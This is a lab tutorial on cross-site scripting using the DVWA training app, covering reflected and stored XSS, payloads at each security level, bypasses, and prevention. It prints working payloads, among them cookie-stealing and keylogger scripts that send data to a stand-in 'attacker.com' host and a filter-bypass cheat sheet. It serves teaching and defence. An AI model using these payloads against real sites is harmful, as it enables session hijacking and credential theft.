# Cross-Site Scripting (XSS) Lab - DVWA

## What is XSS?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. It's like leaving a trap for other people visiting the website.

**Simple Example:**
- You type: `<script>alert('Hacked!')</script>`
- Website shows this to other users
- Their browser runs YOUR code!

---

## Types of XSS

### 1. Reflected XSS
- Malicious script is in the URL
- Victim clicks a bad link
- Script executes immediately
- **Example:** Phishing emails with malicious links

### 2. Stored XSS (Persistent)
- Malicious script is saved in the database
- Affects everyone who views that page
- **Example:** Comment section with malicious code

### 3. DOM-Based XSS
- Vulnerability is in client-side JavaScript
- No server interaction needed
- **Example:** JavaScript that uses URL parameters unsafely

---

## Lab Setup

**Tool:** DVWA (Damn Vulnerable Web Application)  
**Section:** XSS (Reflected) and XSS (Stored)  
**Difficulty Levels:** Low, Medium, High, Impossible

---

## XSS (Reflected) - Security Level: LOW

### Objective
Inject JavaScript code that executes when the page loads.

### Step 1: Understanding the Form
- Navigate to DVWA → XSS (Reflected)
- You'll see a form asking for your name
- Normally, you'd enter: `John`
- Website greets: "Hello John"

### Step 2: Basic XSS Test
**Normal Input:**
```
Name: John
```
**Result:** Hello John

**XSS Test:**
```html
<script>alert('XSS')</script>
```
**Result:** Pop-up box appears! ✅

### Step 3: Advanced XSS Payloads

**Cookie Stealing:**
```html
<script>alert(document.cookie)</script>
```

**Redirect to Malicious Site:**
```html
<script>window.location='http://attacker.com'</script>
```

**Display Hidden Data:**
```html
<script>alert(document.domain)</script>
```

**Change Page Content:**
```html
<script>document.body.innerHTML='<h1>You have been hacked!</h1>'</script>
```

### Vulnerability Explanation
The application displays user input without any filtering or encoding.

**Vulnerable Code (Example):**
```php
echo "Hello " . $_GET['name'];
```

---

## XSS (Reflected) - Security Level: MEDIUM

### Changes from Low
- Some basic filtering applied
- `<script>` tags might be blocked

### Bypass Techniques

**Using Uppercase:**
```html
<SCRIPT>alert('XSS')</SCRIPT>
```

**Using Event Handlers:**
```html
<img src=x onerror=alert('XSS')>
<body onload=alert('XSS')>
<svg onload=alert('XSS')>
```

**Using Different Tags:**
```html
<iframe src="javascript:alert('XSS')">
<object data="javascript:alert('XSS')">
```

**Mixed Case:**
```html
<ScRiPt>alert('XSS')</sCrIpT>
```

---

## XSS (Reflected) - Security Level: HIGH

### Changes from Medium
- Stricter filtering
- Multiple bypass attempts may be needed

### Advanced Bypass Techniques

**Using HTML Entities:**
```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
```

**Using URL Encoding:**
```html
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
```

**Using SVG:**
```html
<svg><script>alert('XSS')</script></svg>
```

**Using Data URI:**
```html
<iframe src="data:text/html,<script>alert('XSS')</script>">
```

---

## XSS (Stored) - Security Level: LOW

### Objective
Store malicious script in the database that affects all users.

### Step 1: Understanding the Guestbook
- Navigate to DVWA → XSS (Stored)
- There's a comment/guestbook form
- Comments are saved and displayed to everyone

### Step 2: Basic Stored XSS
**Payload:**
```html
<script>alert('Stored XSS!')</script>
```

**What happens:**
1. You submit the comment
2. Script is saved in database
3. EVERYONE who views the page sees the alert!
4. Much more dangerous than reflected XSS

### Step 3: Persistent Cookie Stealing
**Payload:**
```html
<script>
fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
</script>
```

**What this does:**
- Sends all visitors' cookies to attacker
- Can steal session tokens
- Can hijack user accounts

### Step 4: Keylogger Injection
**Payload:**
```html
<script>
document.addEventListener('keypress', function(e) {
    fetch('http://attacker.com/log.php?key=' + e.key);
});
</script>
```

**What this does:**
- Records every key pressed by users
- Sends to attacker's server
- Can steal passwords!

---

## XSS (Stored) - Security Level: MEDIUM/HIGH

### Bypass Techniques

**Using Image Tags:**
```html
<img src=x onerror="alert('XSS')">
```

**Using Event Handlers:**
```html
<div onmouseover="alert('XSS')">Hover me!</div>
```

**Using iFrames:**
```html
<iframe src="javascript:alert('XSS')">
```

**Using Links:**
```html
<a href="javascript:alert('XSS')">Click me!</a>
```

---

## Security Level: IMPOSSIBLE

### Why it's Secure
- Proper input validation
- Output encoding (HTML entities)
- Content Security Policy (CSP)
- HTTPOnly cookies

**Secure Code (Example):**
```php
$name = htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
echo "Hello " . $name;
```

**Result:**
- `<script>` becomes `&lt;script&gt;`
- Browser displays it as text, doesn't execute it ✅

---

## Common XSS Payloads

### Basic Alert Boxes
```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
```

### Image-Based XSS
```html
<img src=x onerror=alert('XSS')>
<img src="javascript:alert('XSS')">
<img/src=x onerror=alert('XSS')>
```

### Event Handler XSS
```html
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
<svg onload=alert('XSS')>
```

### Advanced Payloads
```html
<iframe src="javascript:alert('XSS')"></iframe>
<object data="javascript:alert('XSS')">
<embed src="javascript:alert('XSS')">
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
```

### Cookie Stealing
```html
<script>
fetch('http://attacker.com?c=' + document.cookie);
</script>
```

### Session Hijacking
```html
<script>
window.location='http://attacker.com/steal?session=' + document.cookie;
</script>
```

---

## Detection Methods

### Manual Testing
1. Enter `<script>alert(1)</script>` in input fields
2. Check if pop-up appears
3. View page source - is script visible?
4. Try different payloads if blocked

### Signs of XSS Vulnerability
- User input appears in HTML without encoding
- Special characters (< > " ') are not filtered
- JavaScript executes from user input
- No Content Security Policy headers

---

## Prevention Methods

### 1. Input Validation
```php
// Only allow letters and numbers
if (!preg_match('/^[a-zA-Z0-9]+$/', $name)) {
    die("Invalid input");
}
```

### 2. Output Encoding
```php
// Encode special characters
$safe_name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
echo "Hello " . $safe_name;
```

### 3. Content Security Policy (CSP)
```html
<!-- In HTML header -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

```php
// In PHP headers
header("Content-Security-Policy: default-src 'self'");
```

### 4. HTTPOnly Cookies
```php
// Make cookies inaccessible to JavaScript
setcookie("session", $value, [
    'httponly' => true,
    'secure' => true,
    'samesite' => 'Strict'
]);
```

### 5. Input Sanitization Libraries
```javascript
// JavaScript - Use DOMPurify
const clean = DOMPurify.sanitize(dirty);
```

```python
# Python - Use bleach
import bleach
clean = bleach.clean(user_input)
```

---

## Impact of XSS

### What Attackers Can Do:
    Steal cookies and session tokens  
    Hijack user accounts  
    Capture keystrokes (passwords, credit cards)  
    Deface websites  
    Redirect users to malicious sites  
    Install malware  
    Perform actions as the victim user  
    Access sensitive data  

---

## XSS Attack Scenarios

### Scenario 1: Social Media
1. Attacker posts: `<script>/* malicious code */</script>`
2. Everyone who views the post gets infected
3. Attacker steals session tokens
4. Takes over accounts

### Scenario 2: E-commerce
1. Attacker leaves review with XSS
2. Victims view product page
3. Credit card details are stolen
4. Money is lost

### Scenario 3: Banking Website
1. Attacker injects XSS in profile name
2. Bank employee views attacker's profile
3. Employee's admin session is stolen
4. Attacker gains admin access

---



---

## Tools for XSS Testing

### Manual Tools:
- **Browser DevTools** - Inspect and modify HTML/JS
- **Burp Suite** - Intercept and modify requests
- **OWASP ZAP** - Automated vulnerability scanner

### Automated Tools:
- **XSStrike** - Advanced XSS detection
  ```bash
  python xsstrike.py -u "http://target.com?name=test"
  ```
- **XSSer** - Automatic XSS injector
- **Dalfox** - Fast XSS scanner
- **BeEF** - Browser Exploitation Framework

---

## XSS Filter Bypass Cheat Sheet

```html
<!-- Basic bypasses -->
<script>alert('XSS')</script>
<SCRIPT>alert('XSS')</SCRIPT>
<ScRiPt>alert('XSS')</sCrIpT>

<!-- Using other tags -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">

<!-- Event handlers -->
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus>
<div onmouseover="alert('XSS')">Hover</div>

<!-- Encoded -->
<img src=x onerror="&#97;lert('XSS')">
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">

<!-- Without parentheses -->
<script>alert`XSS`</script>
<script>onerror=alert;throw 1</script>
```

---

## Real-World XSS Examples

### Example 1: Twitter (2010)
- Stored XSS in tweets
- Automatic retweeting worm
- Affected thousands of users

### Example 2: MySpace (2005)
- Samy worm via stored XSS
- Added attacker as friend automatically
- Infected 1 million users in 20 hours

### Example 3: British Airways (2018)
- XSS injected payment page
- Stole 380,000 credit cards
- Company fined £20 million

---

## Summary

### Key Takeaways:
1. **XSS** = Injecting malicious JavaScript into websites
2. **Types** = Reflected, Stored, DOM-based
3. **Prevention** = Input validation + Output encoding
4. **Impact** = Account hijacking, data theft, malware
5. **Always test** = But only on systems you own!



---



---


